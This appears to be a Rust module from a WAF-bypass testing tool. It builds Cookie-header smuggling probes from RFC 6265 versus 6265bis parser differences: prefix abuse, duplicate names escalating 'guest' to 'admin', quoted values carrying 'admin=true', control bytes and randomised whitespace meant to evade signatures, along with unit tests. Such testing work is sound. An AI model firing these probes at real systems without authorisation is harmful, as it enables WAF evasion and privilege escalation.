//! Cookie-header parser-differential smuggling (RFC 6265 vs 6265bis).
//!
//! Cookies are one of the most parser-differentiated headers in HTTP:
//! the original RFC 6265 (2011) is strict about what bytes are
//! allowed in a cookie name/value, while RFC 6265bis (Draft, 2024+)
//! relaxes several rules to match deployed reality. Every cookie
//! parser in production sits somewhere between strict-6265 and
//! lax-bis, and the gap is the bypass surface.
//!
//! ## Bypass families
//!
//! - **Prefix bypass** (`__Secure-` / `__Host-`). RFC 6265bis §4.1.3.X
//!   requires that cookies whose name starts with `__Secure-` MUST be
//!   set over HTTPS, and `__Host-` MUST additionally have no Domain
//!   attribute and Path=/. WAFs that authorize requests based on
//!   prefix-match get bypassed by clients sending a cookie with the
//!   prefix but no enforcement on the response path.
//! - **Duplicate-name resolution**: `Cookie: a=safe; a=evil`. RFC
//!   6265 §5.4 ("The user agent SHOULD sort the cookie-list…") says
//!   nothing about server-side merging. Apache HTTP keeps first;
//!   nginx keeps last; Go net/http parses both; PHP varies by
//!   version. WAFs and origins disagree → privilege escalation.
//! - **Quoted-string values** (6265bis §4.1.1). `Cookie: a="b;c=d"`
//!   — strict RFC 6265 forbids `"`; bis allows quoted-string. Strict
//!   WAF parsers see `a` set to literal `"b`, missing the `c=d`
//!   smuggled pair; lax origin parsers see the full quoted value.
//! - **Empty-name cookie** `Cookie: =value`. Per RFC the name MUST
//!   be a non-empty `cookie-name` token; some lenient parsers accept
//!   the empty form and store under the empty key — a hash-map
//!   namespace collision waiting to happen.
//! - **Whitespace insensitivity**: `Cookie: name =value` (space
//!   between name and `=`) — RFC says single SP after `;`, but
//!   whitespace around `=` is parser-specific.
//! - **Control-byte injection in value**: `Cookie: name=a\tb` (TAB
//!   in value) — strict 6265 §4.1.1 forbids CTLs; bis is silent on
//!   internal whitespace. Origin parsers that strip-and-trim differ
//!   from WAFs that scan raw bytes.
//!
//! ## Wire shape
//!
//! Every probe produces a single string suitable for use as a
//! `Cookie:` request header value. The caller is responsible for
//! attaching it to a `Request`; this module is pure data-plane.

use rand::Rng;
use wafrift_types::canary::Canary;
use wafrift_types::pick::pick_from;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Maximum total length wafrift will emit for a single Cookie header
/// value. Browsers typically cap around 4096 bytes per cookie; the
/// server-side cap is usually the full header block size. Picking a
/// generous-but-bounded ceiling keeps probes from being misused as
/// header-amplifier DoS payloads.
pub const MAX_COOKIE_HEADER_BYTES: usize = 8 * 1024;

/// Cookie smuggle variants — each surfaces a different RFC 6265 /
/// 6265bis parser divergence between WAFs and origin servers.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CookieSmuggleVariant {
    /// `__Secure-name=value` with a non-HTTPS context. WAFs that
    /// rely on the prefix for authorization (without checking the
    /// connection scheme) get fooled into trusting an attacker-set
    /// cookie.
    SecurePrefixWithoutHttps,
    /// `__Host-name=value; Domain=evil.example.com`. RFC 6265bis
    /// §4.1.3.2 forbids the Domain attribute for `__Host-`; lax
    /// parsers accept it and the cookie escapes host isolation.
    HostPrefixWithDomain,
    /// `a=safe; a=evil` — duplicate-name pair. WAFs taking the first
    /// value see `safe`; origin servers that take the last (nginx,
    /// PHP recent) see `evil`. Privilege escalation surface.
    DuplicateNameLastWins,
    /// `a="b; c=d"` — RFC 6265bis quoted-string value carrying an
    /// embedded `;` that strict 6265 parsers misread as a new
    /// cookie-pair delimiter.
    QuotedSemicolonValue,
    /// `=value` — empty-name cookie. RFC says illegal; some lenient
    /// parsers store under empty-key, others reject the whole
    /// Cookie header. Fingerprint probe.
    EmptyNamePair,
    /// `name\tvalue` style — a TAB between name and `=` (or in the
    /// value). RFC 6265 §4.1.1 forbids CTL bytes; lax parsers
    /// silently strip them, often producing a different name on each
    /// side of the parser-differential.
    ControlByteInValue,
    /// Whitespace around `=`: `name = value`. RFC says `=` is the
    /// delimiter, no surrounding whitespace allowed; some servers
    /// trim, others preserve. Probes for trimming behaviour.
    WhitespaceAroundEquals,
}

/// A cookie-smuggle probe.
#[derive(Debug, Clone)]
pub struct CookieSmuggleProbe {
    /// Which smuggle shape this probe implements.
    pub variant: CookieSmuggleVariant,
    /// Wire-format header value, ready to splice into a `Cookie:`
    /// request header. Capped at [`MAX_COOKIE_HEADER_BYTES`].
    pub header_value: String,
    /// Telemetry description.
    pub description: String,
    /// Per-probe correlation token.
    pub canary: Canary,
}

impl CookieSmuggleProbe {
    fn finalise(
        variant: CookieSmuggleVariant,
        mut header_value: String,
        description: String,
    ) -> Self {
        if header_value.len() > MAX_COOKIE_HEADER_BYTES {
            // §15 panic-in-production: `String::truncate` panics if the byte
            // index isn't a UTF-8 char boundary. Cookie values pass through
            // `sanitise_cookie_token`, which strips only CR/LF/NUL — multibyte
            // UTF-8 (operator `--credential "café"`, a unicode payload seed)
            // survives, so a >8 KB value with a multibyte char at byte 8192
            // would crash the process. Snap the cut down to a char boundary.
            let cut = crate::floor_char_boundary(&header_value, MAX_COOKIE_HEADER_BYTES);
            header_value.truncate(cut);
        }
        Self {
            variant,
            header_value,
            description,
            canary: Canary::generate(),
        }
    }

    /// `__Secure-name=value` over HTTP (no TLS). RFC 6265bis §4.1.3.1
    /// says receiving stacks MUST reject; lax parsers (or stacks
    /// that only enforce on Set-Cookie not Cookie) accept and
    /// honour. Pair this with a transport that DOES use HTTP (not
    /// HTTPS) to surface the divergence.
    #[must_use]
    pub fn secure_prefix_without_https(name: &str, value: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        let safe_value = sanitise_cookie_token(value);
        let header = format!("__Secure-{safe_name}={safe_value}");
        Self::finalise(
            CookieSmuggleVariant::SecurePrefixWithoutHttps,
            header,
            "__Secure- prefix on a Cookie sent over plain HTTP — RFC 6265bis §4.1.3.1 violation"
                .into(),
        )
    }

    /// `__Host-name=value; Domain=...` — Host-prefix MUST forbid the
    /// Domain attribute per RFC 6265bis §4.1.3.2.
    #[must_use]
    pub fn host_prefix_with_domain(name: &str, value: &str, domain: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        let safe_value = sanitise_cookie_token(value);
        let safe_domain = sanitise_cookie_token(domain);
        let header = format!("__Host-{safe_name}={safe_value}; Domain={safe_domain}");
        Self::finalise(
            CookieSmuggleVariant::HostPrefixWithDomain,
            header,
            "__Host- prefix with Domain attribute — RFC 6265bis §4.1.3.2 violation".into(),
        )
    }

    /// Duplicate-name pair. The first value is benign; the second
    /// carries the smuggled value. Servers that resolve duplicates
    /// "last wins" see the smuggled value; servers that resolve
    /// "first wins" see the benign one.
    #[must_use]
    pub fn duplicate_name_last_wins(name: &str, benign: &str, smuggle: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        let safe_benign = sanitise_cookie_token(benign);
        let safe_smuggle = sanitise_cookie_token(smuggle);
        let header = format!("{safe_name}={safe_benign}; {safe_name}={safe_smuggle}");
        Self::finalise(
            CookieSmuggleVariant::DuplicateNameLastWins,
            header,
            "Duplicate-name cookie pair — first/last resolution differential".into(),
        )
    }

    /// Quoted-string value carrying an embedded `;` that strict RFC
    /// 6265 parsers misread as a cookie-pair delimiter.
    #[must_use]
    pub fn quoted_semicolon_value(name: &str, inner_payload: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        // Strip quotes from inner_payload so the wrapping quotes
        // don't get nested ambiguously.
        let safe_inner = inner_payload.replace(['"', '\r', '\n'], "");
        let header = format!("{safe_name}=\"{safe_inner}\"");
        Self::finalise(
            CookieSmuggleVariant::QuotedSemicolonValue,
            header,
            "Quoted-string value with embedded ';' — RFC 6265 vs 6265bis differential"
                .into(),
        )
    }

    /// `=value` — empty-name pair.
    #[must_use]
    pub fn empty_name_pair(value: &str) -> Self {
        let safe_value = sanitise_cookie_token(value);
        let header = format!("={safe_value}");
        Self::finalise(
            CookieSmuggleVariant::EmptyNamePair,
            header,
            "Empty-name cookie pair — RFC violation, lax parsers accept under empty key"
                .into(),
        )
    }

    /// `name=a<CTL>b` — control byte in value. The CTL is drawn from
    /// [`CONTROL_BYTE_POOL`] per-call so signature WAFs that pin a
    /// specific byte don't catch every probe.
    #[must_use]
    pub fn control_byte_in_value(name: &str, value: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        let safe_value = sanitise_cookie_token(value);
        let ctl = pick_from(CONTROL_BYTE_POOL, b'\t');
        // Insert the CTL byte at the midpoint of the value. §15 panic fix:
        // `sanitise_cookie_token` lets multibyte UTF-8 through, so slicing at
        // a raw `len/2` byte index would PANIC when a codepoint straddles the
        // midpoint (e.g. value "éa" → 3 bytes, mid=1, byte 1 is mid-`é`).
        // Snap the split down to a char boundary first.
        let mid = crate::floor_char_boundary(&safe_value, safe_value.len() / 2);
        let header = format!(
            "{safe_name}={}{}{}",
            &safe_value[..mid],
            ctl as char,
            &safe_value[mid..]
        );
        Self::finalise(
            CookieSmuggleVariant::ControlByteInValue,
            header,
            format!("Control byte 0x{ctl:02x} inside cookie value — strict CTL-reject vs lax-strip"),
        )
    }

    /// `name = value` — whitespace around `=`.
    #[must_use]
    pub fn whitespace_around_equals(name: &str, value: &str) -> Self {
        let safe_name = sanitise_cookie_token(name);
        let safe_value = sanitise_cookie_token(value);
        // Randomise the whitespace count per call to avoid the
        // "exactly one space on each side" signature.
        let mut rng = rand::thread_rng();
        let left_n = rng.gen_range(1..=3);
        let right_n = rng.gen_range(1..=3);
        let header = format!(
            "{safe_name}{}={}{safe_value}",
            " ".repeat(left_n),
            " ".repeat(right_n)
        );
        Self::finalise(
            CookieSmuggleVariant::WhitespaceAroundEquals,
            header,
            "Whitespace around '=' — trim vs preserve differential".into(),
        )
    }
}

impl SmuggleProbe for CookieSmuggleProbe {
    fn canary(&self) -> &Canary {
        &self.canary
    }

    fn technique(&self) -> String {
        let suffix = match self.variant {
            CookieSmuggleVariant::SecurePrefixWithoutHttps => "secure-prefix-without-https",
            CookieSmuggleVariant::HostPrefixWithDomain => "host-prefix-with-domain",
            CookieSmuggleVariant::DuplicateNameLastWins => "duplicate-name-last-wins",
            CookieSmuggleVariant::QuotedSemicolonValue => "quoted-semicolon-value",
            CookieSmuggleVariant::EmptyNamePair => "empty-name-pair",
            CookieSmuggleVariant::ControlByteInValue => "control-byte-in-value",
            CookieSmuggleVariant::WhitespaceAroundEquals => "whitespace-around-equals",
        };
        format!("cookie.{suffix}")
    }

    fn description(&self) -> &str {
        &self.description
    }

    fn artifact(&self) -> SmuggleArtifact {
        // Cookie probes always attach exactly one `Cookie:` header
        // (or two for the duplicate-name variant — but that
        // duplication happens inside the single header value, not
        // across two header lines, in this module's design).
        SmuggleArtifact::Headers(vec![("Cookie".into(), self.header_value.clone())])
    }
}

/// Control bytes the [`ControlByteInValue`](CookieSmuggleVariant::ControlByteInValue)
/// probe may inject. Each is forbidden by strict RFC 6265 §4.1.1 but
/// silently stripped or preserved by various lax parsers.
pub(crate) const CONTROL_BYTE_POOL: &[u8] = &[
    0x09, // HTAB
    0x0B, // VT
    0x0C, // FF
    0x1F, // US
    0x7F, // DEL
];

/// Strip CR / LF / NUL bytes that would break the Cookie header on
/// the wire even when the test is exploring "lax" parsers — those
/// three are universally fatal. Everything else passes through so
/// downstream probes can exercise the actual parser-differential
/// surface.
fn sanitise_cookie_token(s: &str) -> String {
    s.chars().filter(|&c| c != '\r' && c != '\n' && c != '\0').collect()
}

/// Enumerate one probe per variant, seeded with `name` / `value`.
/// Useful for sweep-style probes.
#[must_use]
pub fn all_variants(name: &str, value: &str) -> Vec<CookieSmuggleProbe> {
    vec![
        CookieSmuggleProbe::secure_prefix_without_https(name, value),
        CookieSmuggleProbe::host_prefix_with_domain(name, value, "evil.example.com"),
        CookieSmuggleProbe::duplicate_name_last_wins(name, "benign-token", value),
        CookieSmuggleProbe::quoted_semicolon_value(name, &format!("{value}; admin=true")),
        CookieSmuggleProbe::empty_name_pair(value),
        CookieSmuggleProbe::control_byte_in_value(name, value),
        CookieSmuggleProbe::whitespace_around_equals(name, value),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn sweep_emits_seven_distinct_variants() {
        let v = all_variants("session", "abc123");
        assert_eq!(v.len(), 7);
        let kinds: HashSet<_> = v.iter().map(|p| p.variant).collect();
        assert_eq!(kinds.len(), 7);
    }

    #[test]
    fn secure_prefix_probe_starts_with_underscore_underscore_secure() {
        let p = CookieSmuggleProbe::secure_prefix_without_https("auth", "token");
        assert!(
            p.header_value.starts_with("__Secure-"),
            "expected __Secure- prefix, got: {:?}",
            p.header_value
        );
        assert!(p.header_value.contains("auth=token"));
    }

    #[test]
    fn host_prefix_probe_carries_forbidden_domain_attribute() {
        let p = CookieSmuggleProbe::host_prefix_with_domain("sess", "x", "attacker.tld");
        assert!(p.header_value.starts_with("__Host-"));
        assert!(p.header_value.contains("Domain=attacker.tld"));
    }

    #[test]
    fn duplicate_name_probe_emits_both_pairs_in_order() {
        let p = CookieSmuggleProbe::duplicate_name_last_wins("role", "guest", "admin");
        // First the benign, then the smuggle. "Last wins" parsers
        // resolve to the smuggle; "first wins" parsers resolve to
        // benign.
        let first = p.header_value.find("role=guest").expect("benign present");
        let second = p
            .header_value
            .find("role=admin")
            .expect("smuggle present");
        assert!(
            first < second,
            "benign pair must precede smuggle pair on the wire"
        );
    }

    #[test]
    fn quoted_semicolon_probe_double_quotes_the_value() {
        let p = CookieSmuggleProbe::quoted_semicolon_value("sess", "a;b=c");
        assert!(p.header_value.contains("=\""));
        assert!(p.header_value.ends_with('"'));
    }

    #[test]
    fn quoted_semicolon_probe_strips_inner_quotes() {
        // Anti-rig: inner double-quotes would nest ambiguously and
        // confuse the probe's own structural invariant. Sanitisation
        // must strip them before wrapping.
        let p = CookieSmuggleProbe::quoted_semicolon_value("sess", "a\"b\"c");
        // Outer quotes should still wrap; inner ones gone.
        assert_eq!(
            p.header_value.matches('"').count(),
            2,
            "exactly two quotes (the wrappers), got: {:?}",
            p.header_value
        );
    }

    #[test]
    fn empty_name_probe_starts_with_equals() {
        let p = CookieSmuggleProbe::empty_name_pair("payload");
        assert!(p.header_value.starts_with('='));
        assert!(p.header_value.contains("payload"));
    }

    #[test]
    fn control_byte_probe_injects_a_ctl_from_the_pool() {
        let p = CookieSmuggleProbe::control_byte_in_value("name", "abcdef");
        // At least one byte in the header value must be from the
        // CTL pool (otherwise the probe is silently a no-op).
        let bytes = p.header_value.as_bytes();
        assert!(
            bytes.iter().any(|b| CONTROL_BYTE_POOL.contains(b)),
            "no CTL byte found in header value: {:?}",
            p.header_value
        );
    }

    #[test]
    fn whitespace_probe_inserts_spaces_around_equals() {
        let p = CookieSmuggleProbe::whitespace_around_equals("name", "value");
        // Should contain " =" or "= " (or both) — never "name=value"
        // tightly.
        assert!(
            !p.header_value.contains("name=value"),
            "tight name=value defeats the probe: {:?}",
            p.header_value
        );
        assert!(
            p.header_value.contains(" =") || p.header_value.contains("= "),
            "expected whitespace around '=', got: {:?}",
            p.header_value
        );
    }

    #[test]
    fn sanitise_strips_cr_lf_nul_unconditionally() {
        // Anti-rig: CR/LF/NUL would break the header-line on every
        // HTTP stack. Even probes that intentionally violate RFC
        // 6265 must not break the OVER-the-wire framing.
        let p =
            CookieSmuggleProbe::secure_prefix_without_https("na\rme\n", "val\0ue");
        assert!(!p.header_value.contains('\r'));
        assert!(!p.header_value.contains('\n'));
        assert!(!p.header_value.contains('\0'));
    }

    #[test]
    fn every_probe_carries_a_distinct_canary() {
        // §12 TESTING anti-rig: per-probe correlation must work.
        let a = CookieSmuggleProbe::empty_name_pair("x");
        let b = CookieSmuggleProbe::empty_name_pair("x");
        assert_ne!(a.canary.token, b.canary.token);
        assert_eq!(a.canary.token.len(), 16);
    }

    #[test]
    fn header_value_capped_at_max() {
        // Anti-rig: caller-supplied giant value must NOT produce a
        // megabyte header — cap enforced at finalise().
        let huge = "x".repeat(MAX_COOKIE_HEADER_BYTES * 4);
        let p = CookieSmuggleProbe::secure_prefix_without_https("name", &huge);
        assert!(
            p.header_value.len() <= MAX_COOKIE_HEADER_BYTES,
            "header value exceeded cap: {}",
            p.header_value.len()
        );
    }

    #[test]
    fn empty_inputs_do_not_panic_in_any_builder() {
        let _ = CookieSmuggleProbe::secure_prefix_without_https("", "");
        let _ = CookieSmuggleProbe::host_prefix_with_domain("", "", "");
        let _ = CookieSmuggleProbe::duplicate_name_last_wins("", "", "");
        let _ = CookieSmuggleProbe::quoted_semicolon_value("", "");
        let _ = CookieSmuggleProbe::empty_name_pair("");
        // control_byte_in_value's `mid = safe_value.len() / 2` is
        // safe at 0 / 2 = 0 (slice `[..0]` is empty, `[0..]` is the
        // empty string). Verify no panic.
        let _ = CookieSmuggleProbe::control_byte_in_value("", "");
        let _ = CookieSmuggleProbe::whitespace_around_equals("", "");
    }

    #[test]
    fn control_byte_pool_is_non_empty_and_all_ctl_range() {
        // Anti-rig: every byte in the pool must be in the strict
        // CTL range so the probe's name remains honest.
        assert!(!CONTROL_BYTE_POOL.is_empty());
        for &b in CONTROL_BYTE_POOL {
            assert!(
                b < 0x20 || b == 0x7F,
                "byte 0x{b:02x} is not a CTL per RFC 5234"
            );
        }
    }

    #[test]
    fn control_byte_in_value_multibyte_does_not_panic() {
        // §15 regression: sanitise_cookie_token keeps multibyte UTF-8, so the
        // pre-fix `&safe_value[..len/2]` split panicked when a codepoint
        // straddled the midpoint. "éa" is 3 bytes; len/2 = 1 is the middle of
        // `é` → the exact panic. Now floor_char_boundary snaps it back. Cover
        // several multibyte shapes whose midpoint byte is not a char boundary.
        for v in ["éa", "aé", "日本語", "🦀x", "x🦀", "café-au-lait-日"] {
            let p = CookieSmuggleProbe::control_byte_in_value("sess", v);
            assert!(
                p.header_value.starts_with("sess="),
                "control-byte probe must not panic on multibyte value {v:?}; got {:?}",
                p.header_value
            );
        }
    }

    #[test]
    fn all_variants_multibyte_value_no_panic() {
        // The whole sweep must survive a multibyte name+value across EVERY
        // variant (the midpoint split and the length cap are the panic-prone
        // spots). Pre-fix control_byte_in_value panicked, aborting the sweep.
        let probes = all_variants("名前", "値é日🦀");
        assert_eq!(probes.len(), 7, "sweep must emit one probe per variant");
        for p in &probes {
            assert!(!p.header_value.is_empty());
        }
    }

    #[test]
    fn finalise_truncates_oversize_multibyte_at_char_boundary() {
        // §15 regression: an oversize value built from multibyte chars must
        // truncate to a UTF-8 char boundary (≤ cap), never panic in
        // String::truncate. "日" is 3 bytes; with the "__Secure-nn=" prefix
        // the naive MAX_COOKIE_HEADER_BYTES cut lands mid-codepoint.
        let big = "日".repeat(3000); // 9000 bytes, well over the 8 KiB cap
        let p = CookieSmuggleProbe::secure_prefix_without_https("nn", &big);
        assert!(
            p.header_value.len() <= MAX_COOKIE_HEADER_BYTES,
            "truncated value must be within the cap: {} > {}",
            p.header_value.len(),
            MAX_COOKIE_HEADER_BYTES
        );
        // Reaching here without a panic + a valid String IS the assertion;
        // String guarantees valid UTF-8, which a non-boundary truncate breaks
        // by panicking rather than producing invalid bytes.
    }
}
